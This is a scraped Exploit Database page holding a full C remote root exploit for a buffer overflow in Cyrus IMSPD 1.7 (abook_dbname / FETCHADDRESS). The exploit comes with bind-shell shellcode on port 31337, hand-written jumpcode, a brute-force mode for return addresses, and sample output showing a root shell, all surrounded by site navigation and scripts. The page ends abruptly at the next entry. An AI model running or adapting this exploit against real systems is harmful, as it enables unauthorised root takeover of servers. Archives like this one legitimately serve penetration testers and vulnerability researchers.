anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 139
Cyrus IMSPD 1.7 - 'abook_dbname' Remote Code Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCyrus IMSPD 1.7 - 'abook_dbname' Remote Code ExecutionEDB-ID:139CVE:EDB Verified:Author:SpikEType:remoteExploit:/Platform:LinuxDate:2003-12-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*** Cyrus IMSPD Remote Root Exploit** -------------------------------**** Bug found by: Felix Lindner <felix.lindner@nruns.com>** Exploit coded by: SpikE <spike_vrm@mail.com>**** Exploitation techinique:**** As said by Felix Lindner, the bug lies in the "abook_dbname" function. To cause** the overrun, we must call this function with a long "name" variable. It can be** acomplished by supplying the FETCHADDRESS command. This command takes 2 parameters.** The first one is exactly the "name" var. So, to cause the overflow, we must just** send the FETCHADDRESS command with an overlong argument.** To cause the overflow is easy, but using it to execute arbitrary commands is not** so easy. It is because IMSPd filters all characters that is grather than 0x80.** Well, put the shellcode is not the problem, cause IMSPd does not filter the args** after the second one, so, the Shellcode goes in the third arg. The problem is that** the address of the buffer where the shellcode is placed contains chars grather than** 0x80 and we can not supply this addr. Well, how it can be done??? After some time** of research, I found that the address of the buffer where the "name" var is placed** does not contains these characters (at least on my box). So, I manange my buffer** to overwrite the EIP with this address. But there is another problem: I can not write** my shellcode here. Again, after some time, I got the solution. Looking at the stack** after the overflow, I found the address of the buffer where the shellcode was placed.** So, I coded a Jumpcode to get this addr from the stack, add some offset to the shellcode** and jump there. There was a dificult task once the RET opcode is 0xc3 and I can not** place the code in the buffer. To circumvent it. I overflowned the EIP and the next** four bytes with the same value. This way, when I get the control, I know where I am.** With this ability, I can take this value, add some offset and make and ADD at this** location to turn an 0x45 in an 0xc3, RET.** Well, this is how I have acomplished this task. As you can see, there two possibilities** of success. You can be lucky and found a system that the address os shellcode does not** have invalid chars or the name addr too. Anyone of this will do the task.**** Well, that is all. Sorry for my poor english (I am brazilian), I am tired to correct it.** I hope one can improve this code to be more reliable, but for now, it is not so BAD.**** Screenshot:**** Hardcoded:**** SpikE@VermE imsp]$ ./a.out -t 0 -h localhost**** ==[ Cyrus IMSPd Remote Root Exploit bY SpikE ]==**** *** Target plataform : IMSPd 1.7 - Red Hat Linux release 8.0 (Psyche)** *** Target host : localhost** *** Target port : 406** *** Bind to port : 31337** *** Target RET : 0x08065368**** [+] Connected** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...** [+] Yeap.. It is a root shell**** Linux VermE.com.br 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)** cat /etc/issue** Red Hat Linux release 8.0 (Psyche)** Kernel \r on an \m**** exit** [SpikE@VermE imsp]$**** Bruteforce:**** [SpikE@VermE imsp]$ ./a.out -h localhost -b**** ==[ Cyrus IMSPd Remote Root Exploit bY SpikE ]==**** *** Target host : localhost** *** Target port : 406** *** Bind to port : 31337** *** Bruteforce mode start : 0x08065357**** [+] Using RetAddr = 0x08065357** [+] Connected** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...**** [+] Using RetAddr = 0x0806535b** [+] Connected** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...**** [+] Using RetAddr = 0x0806535f** [+] Connected** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...**** [+] Using RetAddr = 0x08065363** [+] Connected** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...**** [+] Using RetAddr = 0x08065367** [+] Connected** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...**** [+] Using RetAddr = 0x0806536b** [+] Connected** ** [+] Creating evil buffer** [+] Sending evil buffer** [+] Verifying ...** [+] Yeap.. It is a root shell**** Linux VermE.com.br 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)** cat /etc/issue** Red Hat Linux release 8.0 (Psyche)** Kernel \r on an \m**** exit** [SpikE@VermE imsp]$*****/#include <getopt.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <unistd.h>#include <stdlib.h>#include <string.h>#include <netdb.h>#include <errno.h>#include <netinet/in.h>#include <stdio.h>/*--< Prototypes >--*/void Usage(char *);void fatal(char *);int ConectToHost(char *,int);char *CreateEvilBuffer(int,int);int VerifyXpl(char *, int);void doHack(int);int GetNextAddr(int);/*--< Defines >--*/#define DEFAULT_PORT 406#define DEFAULT_START_ADDRESS 0x8061001#define BRUTEFORCE 1#define TARGET 2#define STDIN 0#define STDOUT 1#define ROOT_PORT 31337#define PORT_OFFSET 29/*--< From IMSP Source >--*/char im_table[256] = {0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 2, 2, 0, 2, 2,2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,2, 7, 0, 7, 7, 6, 7, 7, 2, 2, 6, 7, 7, 7, 7, 7,7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 0, 7, 7, 7,7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 2, 7, 7, 7, 2,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};#define isqstr(c) (im_table[(unsigned char)(c)]&2)/*--< END >--*/struct{char *Name;int Retaddr;}Targets[] ={"IMSPd 1.7 - Red Hat Linux release 8.0 (Psyche)",0x8065368,"IMSPd 1.6a3 - Red Hat Linux release 8.0 (Psyche)",0x8061d78,// Finish0,0};// Shellcode by Marco Ivaldi <raptor 0xdeadbeef info>char Shellcode[] ="\x31\xc0\x31\xdb\xb0\x17\xcd\x80""\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80""\x89\xc7\x52\x66\x68""BP" // Port to bind"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80""\xb0\x66\xb3\x04\xcd\x80""\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80""\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80""\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";// Jumpcode bY SpikEchar JmpToShellcode[] ="\x41" // nop like"\x41" // nop like"\x41" // nop like"\x41" // nop like"\x41" // nop like"\x41" // nop like"\x41" // nop like"\x58" // pop %eax"\x6a\x7e" // push $0x7e"\x5b" // pop %ebx"\x01\x58\x23" // add %ebx,0x22(%eax)"\x58""\x58" // pop %eax"\x58" // pop %eax"\x58" // pop %eax"\x58" // pop %eax"\x58" // pop %eax"\x58" // pop %eax"\x58" // pop %eax"\x58" // pop %eax"\x6a\x7e" // push $0x7e"\x58" // pop %eax"\x01\x44\x24\x04" // add %eax,0x4(%esp,1)"\x01\x44\x24\x04" // add %eax,0x4(%esp,1)"\x58" // pop %eax"\x45" // ret"\x45" // ret"\x45" // ret"\x45" // ret"\x45" // ret"\x45" // ret"\x45" // ret"\x45"; // retstruct STACK{char name[132];int eip;int ID;int Name;int Acl;};int main(int argc, char **argv){extern char *optarg;extern int optind;char opt;char *Host = NULL;int Port = DEFAULT_PORT;int Flags = 0;int StartAddress = DEFAULT_START_ADDRESS;int TargetNumber = 0;int Sock,rootSock,i;char *EvilBuffer;int BindPort = ROOT_PORT;fprintf(stdout,"\n==[ Cyrus IMSPd 1.7 Remote Root Exploit bY SpikE ]==\n\n");// Process argumentswhile ( (opt = getopt(argc,argv,"h:t:p:ba:r:")) != EOF){switch(opt){case 'r':BindPort = atoi(optarg);if(!BindPort) Usage(argv[0]);break;case 'h':Host = optarg;break;case 'p':Port = atoi(optarg);if(!Port) Usage(argv[0]);break;case 'b':if(Flags == 0)Flags = BRUTEFORCE;elseUsage(argv[0]);break;case 'a':if( sscanf(optarg,"0x%lx",&StartAddress) != 1)Usage(argv[0]);break;case 't':TargetNumber = atoi(optarg);if(Flags == 0)Flags = TARGET;elseUsage(argv[0]);break;default: Usage(argv[0]);break;}}if(Host == NULL || Flags == 0) Usage(argv[0]);// Verify targetfor(i=0;;i++)if(Targets[i].Name == 0) break;if(--i<TargetNumber) Usage(argv[0]);if(Flags == TARGET)fprintf(stdout,"*** Target plataform : %s\n",Targets[TargetNumber].Name);fprintf(stdout,"*** Target host : %s\n",Host);fprintf(stdout,"*** Target port : %u\n",Port);fprintf(stdout,"*** Bind to port : %u\n",BindPort);if(Flags == TARGET)fprintf(stdout,"*** Target RET : %#010x\n\n",Targets[TargetNumber].Retaddr);elsefprintf(stdout,"*** Bruteforce mode start : %#010x\n\n",StartAddress);switch(Flags){case TARGET:Sock = ConectToHost(Host,Port);if(Sock == -1) fatal("Could not connect");else fprintf(stdout,"[+] Connected\n");fprintf(stdout,"[+] Creating evil buffer\n");EvilBuffer = CreateEvilBuffer(Targets[TargetNumber].Retaddr,BindPort);fprintf(stdout,"[+] Sending evil buffer\n");scanf("%d",&i);send(Sock,EvilBuffer,strlen(EvilBuffer),0);sleep(1);fprintf(stdout,"[+] Verifying ...\n");sleep(1);if( (rootSock = VerifyXpl(Host,BindPort)) >=0){close(Sock);free(EvilBuffer);fprintf(stdout,"[+] Yeap.. It is a root shell\n\n");doHack(rootSock);close(rootSock);exit(0);}elsefatal("No root shell. Maybe next time");break;default:for(;;){fprintf(stdout,"[+] Using RetAddr = %#010x\n",StartAddress);Sock = ConectToHost(Host,Port);if(Sock == -1){// To avoid stop the bruteforcefprintf(stdout,"[+] Could not connect. Waiting...\n\n");sleep(120);}else{fprintf(stdout,"[+] Connected\n");fprintf(stdout,"[+] Creating evil buffer\n");EvilBuffer = CreateEvilBuffer(StartAddress,BindPort);fprintf(stdout,"[+] Sending evil buffer\n");send(Sock,EvilBuffer,strlen(EvilBuffer),0);sleep(1);fprintf(stdout,"[+] Verifying ...\n");sleep(1);if( (rootSock = VerifyXpl(Host,BindPort)) >=0){   // actualite informatiqueclose(Sock);free(EvilBuffer);fprintf(stdout,"[+] Yeap.. It is a root shell\n\n");doHack(rootSock);close(rootSock);exit(0);}close(Sock);free(EvilBuffer);fprintf(stdout,"\n");StartAddress = GetNextAddr(StartAddress);}}break;}free(EvilBuffer);close(Sock);}void Usage(char *Prog){int i;fprintf(stderr, "Usage: %s -h hostname <options>\n\n""Options:\n\n"" -t target : Select the target\n"" -p portnumber : Sets a new port number\n"" -b : Bruteforce mode\n"" -a address : Defines the start address to bruteforce (Format: 0xdeadbeef)\n"" -r port : Defines the port to bind (Default = 31337)\n\n""Targets:\n\n",Prog);for(i=0;;i++){if(Targets[i].Name != 0)fprintf(stderr," [%u] %s\n",i,Targets[i].Name);elsebreak;}fprintf(stderr,"\n");exit(1);}void fatal(char *ErrorMsg){fprintf(stderr,"[-] %s\n\n",ErrorMsg);exit(1);}int ConectToHost(char *Host,int Port){struct sockaddr_in server;struct hostent *hp;int s;server.sin_family = AF_INET;hp = gethostbyname(Host);if(!hp) return(-1);memcpy(&server.sin_addr,hp->h_addr,hp->h_length);server.sin_port = htons(Port);s = socket(PF_INET,SOCK_STREAM,0);if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)return(-1);return(s);}char *CreateEvilBuffer(int Retaddr,int BindPort){struct STACK Buffer;char *Ptr = (char *)&Buffer;char NOPs[2000];static char Buf[sizeof(Buffer)+sizeof(NOPs)+sizeof(Shellcode)+100];uint16_t *PortPtr = (uint16_t *)(Shellcode+PORT_OFFSET);int i;memset(&Buffer,0x41,sizeof(Buffer));memset(NOPs,0x90,sizeof(NOPs));*PortPtr = htons(BindPort);memcpy(Ptr,JmpToShellcode,sizeof(JmpToShellcode)-1);Buffer.eip = Retaddr;Buffer.ID = Retaddr;Buffer.Name = 0x00;NOPs[sizeof(NOPs)-1] = 0;sprintf(Buf,"SPK FETCHADDRESS \"%s\" \"SPK\" %s%s\r\n",(char *)&Buffer,NOPs,Shellcode);return(Buf);}void doHack(int Sock){char buffer[1024 * 10];int count;fd_set readfs;write(Sock,"uname -a;id\n",12);while(1){FD_ZERO(&readfs);FD_SET(STDIN, &readfs);FD_SET(Sock, &readfs);if(select(Sock + 1, &readfs, NULL, NULL, NULL) > 0){if(FD_ISSET(STDIN, &readfs)){if((count = read(STDIN, buffer, 1024)) <= 0){if(errno == EWOULDBLOCK || errno == EAGAIN)continue;else{close(Sock);exit(-1);}}write(Sock, buffer, count);}if(FD_ISSET(Sock, &readfs)){if((count = read(Sock, buffer, 1024)) <= 0){if(errno == EWOULDBLOCK || errno == EAGAIN)continue;else{close(Sock);exit(-1);}}write(STDOUT, buffer, count);}}}}int VerifyXpl(char *Host, int Port){struct sockaddr_in server;struct hostent *hp;int s;// Create client structserver.sin_family = AF_INET;hp = gethostbyname(Host);if(!hp)return(-1);memcpy(&server.sin_addr,hp->h_addr,hp->h_length);server.sin_port = htons(Port);s = socket(PF_INET,SOCK_STREAM,0);if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)return(-1);return(s);}int GetNextAddr(int Addr){Addr+=4;for(;;){if( !isqstr( (Addr & 0x000000FF) ) ) Addr+=4;else if( !isqstr( (Addr & 0x0000FF00) >> 8 ) ) Addr+=4;else if( !isqstr( (Addr & 0x00FF0000) >> 16 ) ) Addr+=4;else if( !isqstr( (Addr & 0xFF000000) >> 24 ) ) Addr+=4;else break;}return(Addr);}// milw0rm.com [2003-12-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 140
XSOK 1.02 - '-xsokdir' Local Buffer Overflow Game - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { 